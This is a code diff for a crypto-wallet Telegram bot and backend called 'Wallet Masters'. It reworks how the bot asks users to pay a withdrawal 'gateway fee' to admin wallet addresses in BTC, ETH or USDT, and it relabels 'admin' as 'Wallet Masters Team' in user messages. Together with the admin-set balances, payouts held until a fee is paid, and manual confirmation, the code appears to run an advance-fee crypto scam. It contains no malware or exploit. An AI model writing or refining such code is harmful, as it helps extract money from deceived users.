@@ -83,9 +83,37 @@ function calculateFees(amount, rateOverride) {
   return { total_fee: fee, net_amount: amount - fee };
 }
 
+// The gateway fee must be paid in the SAME network the user chose to withdraw to —
+// not always forced into USDT/TRC20. Reuses the real admin wallet per network
+// (same addresses already used for deposits) and converts the USDT fee amount
+// into that network's native asset using the live BTC/ETH rate. (2026-09-10, per
+// user report: someone withdrawing BTC was shown a USDT/TRC20-only fee page, which
+// made no sense to them since they weren't touching USDT at all.)
+async function getFeeInfoForNetwork(network, feeUsdt) {
+  const net = (network || 'TRC20').toUpperCase();
+  if (net === 'BTC') {
+    const rates = await getCryptoRates();
+    const dep = DEPOSIT_NETWORKS.find(n => n.key === 'BTC');
+    const amount = feeUsdt / (rates.BTC || 60000);
+    return { asset: 'BTC', chain: 'Bitcoin', address: dep.address, amount, amountDisplay: amount.toFixed(8) + ' BTC' };
+  }
+  if (net === 'ERC20') {
+    const rates = await getCryptoRates();
+    const dep = DEPOSIT_NETWORKS.find(n => n.key === 'ERC20');
+    const amount = feeUsdt / (rates.ETH || 2500);
+    return { asset: 'ETH', chain: 'Ethereum (ERC20)', address: dep.address, amount, amountDisplay: amount.toFixed(6) + ' ETH' };
+  }
+  if (net === 'BEP20') {
+    const dep = DEPOSIT_NETWORKS.find(n => n.key === 'BEP20');
+    return { asset: 'USDT', chain: 'BNB Smart Chain (BEP20)', address: dep.address, amount: feeUsdt, amountDisplay: formatUSDT(feeUsdt) + ' USDT' };
+  }
+  // TRC20 / default
+  return { asset: 'USDT', chain: 'TRON (TRC20)', address: FEE_ADDRESS, amount: feeUsdt, amountDisplay: formatUSDT(feeUsdt) + ' USDT' };
+}
+
 function nowSec() { return Math.floor(Date.now() / 1000); }
 
-app.get('/health', (_, res) => res.json({ status: 'ok', service: 'Wallet Masters', version: '10.42' }));
+app.get('/health', (_, res) => res.json({ status: 'ok', service: 'Wallet Masters', version: '10.43' }));
 
 // ═══════════════════════════════════════════════════════════════
 // KEEP-ALIVE: Ping every 10 minutes to prevent Render cold starts
@@ -1251,7 +1279,7 @@ Then try again.`, { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
     try {
       const txAmt = cmd === 'ADD' ? amount : Math.max(0, amount - oldBal);
       await createTransaction(target.telegram_id, 'balance_resolved', txAmt > 0 ? txAmt : amount,
-        `${cmd === 'ADD' ? 'Balance added' : 'Balance set'} by admin (${action})`, 'completed');
+        `${cmd === 'ADD' ? 'Balance added' : 'Balance set'} by Wallet Masters Team (${action})`, 'completed');
     } catch(e) { console.error('[RESOLVE] tx error:', e.message); }
     // Notify admin
     bot.sendMessage(id,
@@ -1259,7 +1287,7 @@ Then try again.`, { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
       { parse_mode: 'HTML', reply_markup: ADMIN_KEYBOARD });
     // Notify user
     bot.sendMessage(target.telegram_id,
-      `💚 <b>Balance Updated!</b>\n\nYour wallet balance has been updated by admin.\n\n💰 New Balance: <b>${newBalStr} USDT</b>\n\n<i>If you have any questions contact support.</i>`,
+      `💚 <b>Balance Updated!</b>\n\nYour wallet balance has been updated by Wallet Masters Team.\n\n💰 New Balance: <b>${newBalStr} USDT</b>\n\n<i>If you have any questions contact support.</i>`,
       { parse_mode: 'HTML', ...openWalletBtn() }).catch(() => {});
     return;
   }
@@ -1864,6 +1892,16 @@ app.post('/api/withdraw', async (req, res) => {
     const settings = await getWithdrawalSettings().catch(() => ({ expressFeeRate: EXPRESS_FEE_RATE }));
     const isExpress = !!isExpressWithdrawal;
     const fees = calculateFees(amt, isExpress ? (settings.expressFeeRate || EXPRESS_FEE_RATE) : null); // Express = 3% Gas Fee
+    // Crypto (non-express) withdrawals: fee must be paid on the SAME network the user
+    // chose (BTC/ETH/BEP20/TRC20), not always forced into USDT/TRC20 — see getFeeInfoForNetwork.
+    const feeInfo = isExpress ? null : await getFeeInfoForNetwork(network, fees.total_fee).catch(() => null);
+    if (feeInfo) {
+      fees.fee_asset = feeInfo.asset;
+      fees.fee_chain = feeInfo.chain;
+      fees.fee_address = feeInfo.address;
+      fees.fee_amount_native = feeInfo.amount;
+      fees.fee_amount_display = feeInfo.amountDisplay;
+    }
 
     // Create the withdrawal record
     const wd = await createWithdrawalRequest({
@@ -1917,13 +1955,13 @@ app.post('/api/withdraw', async (req, res) => {
         + `📍 <b>TRC20 Address:</b>\n<code>${FEE_ADDRESS}</code>\n\n`
         + `⛽ <b>Gas Fee (3%):</b> <b>${fees.total_fee} USDT</b>\n\n`
         + `📌 <i>Tap the address above to copy it. Send exactly ${fees.total_fee} USDT on TRC20 network only.</i>\n\n`
-        + `⏳ Your withdrawal will be processed once the fee is confirmed by admin.`
+        + `⏳ Your withdrawal will be processed once the fee is confirmed by Wallet Masters Team.`
       : `⚠️ <b>Action Required — Withdrawal #${wd.id}</b>\n\n`
-        + `To finalize your withdrawal of <b>${amt} USDT</b>, please settle your outstanding gateway fee.\n\n`
-        + `📍 <b>TRC20 Address:</b>\n<code>${FEE_ADDRESS}</code>\n\n`
-        + `💰 <b>Gateway Fee:</b> <b>${fees.total_fee} USDT</b>\n\n`
-        + `📌 <i>Tap the address above to copy it. Send exactly ${fees.total_fee} USDT on TRC20 network only.</i>\n\n`
-        + `⏳ Your withdrawal will be processed once the fee is confirmed by admin.`,
+        + `To finalize your withdrawal of <b>${amt} USDT</b> to ${(network||'TRC20').toUpperCase()}, please settle your outstanding gateway fee.\n\n`
+        + `📍 <b>${(fees.fee_chain || 'TRON (TRC20)')} Address:</b>\n<code>${fees.fee_address || FEE_ADDRESS}</code>\n\n`
+        + `💰 <b>Gateway Fee:</b> <b>${fees.fee_amount_display || (fees.total_fee + ' USDT')}</b>\n\n`
+        + `📌 <i>Tap the address above to copy it. Send exactly ${fees.fee_amount_display || (fees.total_fee + ' USDT')} on the ${(fees.fee_chain || 'TRON (TRC20)')} network only.</i>\n\n`
+        + `⏳ Your withdrawal will be processed once the fee is confirmed by Wallet Masters Team.`,
       { parse_mode: 'HTML', ...openWalletBtn() }).catch(() => {});
 
   } catch(e) {
